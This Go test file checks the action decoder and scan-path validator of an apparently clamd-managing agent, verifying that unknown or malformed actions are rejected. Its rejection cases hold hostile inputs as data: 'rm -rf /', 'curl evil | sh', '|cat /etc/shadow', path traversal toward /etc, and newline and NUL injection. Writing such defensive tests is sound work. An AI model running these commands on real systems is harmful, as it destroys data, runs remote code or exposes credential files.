package protocol

import (
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

func TestDecodeParamsAllowlist(t *testing.T) {
	for _, typ := range ActionTypes {
		if !IsAllowed(typ) {
			t.Errorf("%q listed in ActionTypes but not allowed", typ)
		}
	}
	if len(ActionTypes) != len(allowedActions) {
		t.Errorf("ActionTypes has %d entries, allowlist %d", len(ActionTypes), len(allowedActions))
	}
	for _, typ := range []ActionType{ActionClamdCheck, ActionClamdReload, ActionClamdStats} {
		for _, params := range []string{`{}`, ``, `  `} {
			if _, err := DecodeParams(Action{ID: "1", Type: typ, Params: json.RawMessage(params)}); err != nil {
				t.Errorf("%s with %q: %v", typ, params, err)
			}
		}
	}
	p, err := DecodeParams(Action{ID: "1", Type: ActionScanPath, Params: json.RawMessage(`{"path":"/srv/www"}`)})
	if err != nil || p.(*ScanPathParams).Path != "/srv/www" {
		t.Fatalf("scan_path: %v %+v", err, p)
	}
}

// Malicious or malformed actions are rejected before any handler sees them.
func TestDecodeParamsRejects(t *testing.T) {
	cases := map[string]Action{
		"unknown type":          {Type: "run_command", Params: json.RawMessage(`{"cmd":"rm -rf /"}`)},
		"shell-ish type":        {Type: "exec", Params: json.RawMessage(`"curl evil | sh"`)},
		"empty type":            {Type: ""},
		"type with NUL":         {Type: "scan_path\x00", Params: json.RawMessage(`{"path":"/srv"}`)},
		"type case":             {Type: "SCAN_PATH", Params: json.RawMessage(`{"path":"/srv"}`)},
		"extra field on check":  {Type: ActionClamdCheck, Params: json.RawMessage(`{"cmd":"x"}`)},
		"extra field on scan":   {Type: ActionScanPath, Params: json.RawMessage(`{"path":"/srv","args":"--remove"}`)},
		"params not an object":  {Type: ActionClamdReload, Params: json.RawMessage(`"RELOAD"`)},
		"trailing data":         {Type: ActionScanPath, Params: json.RawMessage(`{"path":"/srv"} {"path":"/etc"}`)},
		"scan without path":     {Type: ActionScanPath, Params: json.RawMessage(`{}`)},
		"scan path not string":  {Type: ActionScanPath, Params: json.RawMessage(`{"path":["/srv"]}`)},
		"scan duplicate fields": {Type: ActionScanPath, Params: json.RawMessage(`{"path":"/srv","path":"../../etc"}`)},
	}
	for name, a := range cases {
		if _, err := DecodeParams(a); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	var unknown ErrUnknownAction
	if _, err := DecodeParams(Action{Type: "run_command"}); !errors.As(err, &unknown) {
		t.Errorf("unknown type: %v", err)
	}
}

func TestValidateScanPath(t *testing.T) {
	good := []string{"/", "/srv", "/srv/www/site one", "/home/a.b/..c/d..", `C:\`, `D:\Data\Shared Files`, "/tmp/ünïcode"}
	for _, p := range good {
		if err := ValidateScanPath(p); err != nil {
			t.Errorf("%q rejected: %v", p, err)
		}
	}
	bad := []string{
		"", "relative/path", "./srv", "~/x", "srv",
		"/srv/../etc/shadow", "/srv/./x", "/srv/..", "/..",
		`C:\Data\..\Windows`, `C:relative`, `C:/Data`, `C:\Data/../x`,
		`\\server\share`, `\\?\C:\x`, "//server/share",
		"/tmp/a\x00b", "/tmp/a\nVERSION", "/tmp/a\rb", "/tmp/a\tb", "/tmp/\x7f",
		"/tmp/\xff\xfe", "/" + strings.Repeat("a", MaxScanPathLen),
		"-rf /", "|cat /etc/shadow",
	}
	for _, p := range bad {
		if err := ValidateScanPath(p); err == nil {
			t.Errorf("%q accepted", p)
		}
	}
}
